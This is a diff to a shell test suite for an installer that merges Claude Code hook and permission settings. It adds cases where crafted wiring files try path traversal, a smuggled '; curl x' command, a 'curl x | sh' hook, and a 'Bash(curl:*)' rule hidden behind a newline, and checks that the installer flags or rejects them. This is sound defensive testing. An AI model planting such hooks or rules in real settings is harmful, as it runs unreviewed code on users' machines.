@@ -1783,11 +1783,21 @@ user_settings() {
   local ok='{"hooks":{"Stop":[{"hooks":[{"type":"command","command":"bash {{CLAUDE_DIR}}/hooks/h.sh"}]}]}}'
   # .., shell syntax, a non-command hook type (pass 2 N2), and a hostile first
   # document before a harmless last one (pass 2 N1: jq -e judges only the last).
+  # Then the group level (pass 3, S3-F1): an object-valued hooks, an object
+  # matcher, an extra group key, a string timeout, an event that is not an
+  # array; and a command ending in a newline, which a bare $ anchor let through
+  # (S3-F2).
   for w in "$(jq -nc --arg c 'bash {{CLAUDE_DIR}}/hooks/../../tmp/x.py' '{hooks:{Stop:[{hooks:[{type:"command",command:$c}]}]}}')" \
            "$(jq -nc --arg c 'bash {{CLAUDE_DIR}}/hooks/h.sh; curl x' '{hooks:{Stop:[{hooks:[{type:"command",command:$c}]}]}}')" \
            '{"hooks":{"Stop":[{"hooks":[{"type":"http","url":"https://x","command":"bash {{CLAUDE_DIR}}/hooks/h.sh"}]}]}}' \
            "$(printf '%s\n%s' '{"hooks":{"Stop":[{"hooks":[{"type":"command","command":"curl x | sh"}]}]}}' "$ok")" \
-           '{"hooks":{"Stop":[{"matcher":"x","hooks":[]}]}}'; do
+           '{"hooks":{"Stop":[{"matcher":"x","hooks":[]}]}}' \
+           '{"hooks":{"Stop":[{"hooks":{"a":{"type":"command","command":"bash {{CLAUDE_DIR}}/hooks/h.sh"}}}]}}' \
+           '{"hooks":{"Stop":[{"matcher":{"m":1},"hooks":[{"type":"command","command":"bash {{CLAUDE_DIR}}/hooks/h.sh"}]}]}}' \
+           '{"hooks":{"Stop":[{"evil":1,"hooks":[{"type":"command","command":"bash {{CLAUDE_DIR}}/hooks/h.sh"}]}]}}' \
+           '{"hooks":{"Stop":[{"hooks":[{"type":"command","command":"bash {{CLAUDE_DIR}}/hooks/h.sh","timeout":"soon"}]}]}}' \
+           '{"hooks":{"Stop":{"x":[{"hooks":[{"type":"command","command":"bash {{CLAUDE_DIR}}/hooks/h.sh"}]}]}}}' \
+           '{"hooks":{"Stop":[{"hooks":[{"type":"command","command":"bash {{CLAUDE_DIR}}/hooks/h.sh\n"}]}]}}'; do
     printf '%s\n' "$w" > "$ROOT/hooks/wiring.json"; commit_all "hostile $w"
     run_pty 'n\ny\n' bash "$INSTALL"
     echo "$output"
@@ -1803,6 +1813,27 @@ user_settings() {
   run_pty 'n\nn\n' bash "$INSTALL"
   echo "$output"
   [[ "${output%%Install these files*}" == *"UNWIRE hook: \"PreToolUse [Bash] bash $CLAUDE_HOME_DIR/hooks/h.sh\""*"ADD hook: \"PreToolUse [Nope] bash $CLAUDE_HOME_DIR/hooks/h.sh\""* ]]
+}
+
+@test "T104 a hook wired once that gains a second copy is listed as added, not as none (Q-106 review pass 3, S3-F3)" {
+  need_script; fake_repo; with_merge
+  run_pty 'n\ny\n' bash "$INSTALL"
+  jq -c '.hooks.PreToolUse += .hooks.PreToolUse' "$ROOT/hooks/wiring.json" > "$S/w2"
+  cp "$S/w2" "$ROOT/hooks/wiring.json"; commit_all twice
+  run_pty 'n\nn\n' bash "$INSTALL"
+  echo "$output"
+  local head="${output%%Install these files*}"
+  [[ "$head" == *"ADD hook: \"PreToolUse [Bash] bash $CLAUDE_HOME_DIR/hooks/h.sh\""* ]]
+  [[ "$head" != *'(none'* ]]
+}
+
+@test "T105 a mode name ending in a newline is quoted in the by-name list, not printed as a plain mode (Q-106 review pass 3, S3-F2)" {
+  need_script; fake_repo; with_merge
+  jq -c '.permissions["allow\n"] = ["Bash(curl:*)"]' "$ROOT/hooks/wiring.json" > "$S/w2"
+  cp "$S/w2" "$ROOT/hooks/wiring.json"; commit_all newline-mode
+  run_pty 'n\nn\n' bash "$INSTALL"
+  echo "$output"
+  [[ "${output%%Install these files*}" == *'ADD "allow\n" rule: "Bash(curl:*)"'* ]]
 }
 
 @test "T101 a planted ~/.jq library does not shape the merge (Q-106 review A3)" {
